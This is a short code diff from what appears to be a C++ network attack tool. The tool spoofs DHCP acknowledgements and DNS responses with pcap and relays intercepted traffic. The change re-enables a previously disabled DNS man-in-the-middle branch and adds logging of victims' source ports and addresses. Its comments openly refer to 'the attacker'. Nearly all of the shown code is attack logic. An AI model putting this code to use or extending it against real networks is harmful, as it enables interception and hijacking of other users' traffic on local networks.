@@ -119,11 +119,9 @@ int sendDNSResponse(char* raw_packet, char* qDNS, pcap_t* sock, std::map<uint16_
 																	// returning the size of the packet
 	if (tSize == -1) /* Chcking for an impossible size, that means the packet has to be sent to a real DNS server*/
 	{
-		return 0; // no MITM for now
-		/*
+		//return 0; // no MITM for now
 		portForwarding.insert(std::pair< uint16_t, uint32_t>(((UDP_header*)&qDNS[sizeof(IP_header)])->src_port, ((IP_header*)qDNS)->ip_srcaddr));
 		tSize = dnsMITM(qDNS, (uint8_t*)raw_packet, info);
-		*/
 	}
 	if(pcap_sendpacket(
 		sock,
@@ -245,8 +243,12 @@ DWORD WINAPI startSpoofing(LPVOID info)
 			if (getDHCPtype(pDHCP) == 3) // Checks for a request packet
 				responseError = sendACKPacket(response_packet, pDHCP, pIP, sock,(*(AddressInfo*)(info)));
 		if (pUDP.dst_port == htons(53)) // Checks for a DNS packet
-			if(pIP.ip_srcaddr != inet_addr((char*)((AddressInfo*)info)->ipv4)) // Checks the packet wasnt sent by the attacker
+			if (pIP.ip_srcaddr != inet_addr((char*)((AddressInfo*)info)->ipv4)) // Checks the packet wasnt sent by the attacker
+			{
+				std::cout << ntohs(pUDP.src_port) << ":";
+				printIP(pIP.ip_srcaddr);
 				responseError = sendDNSResponse(response_packet, raw_packet, sock, portTable, (*(AddressInfo*)(info)));
+			}
 		if (portTable.find(htons(pUDP.dst_port)) != portTable.end())
 		{
 			int size = manInTheMiddle(
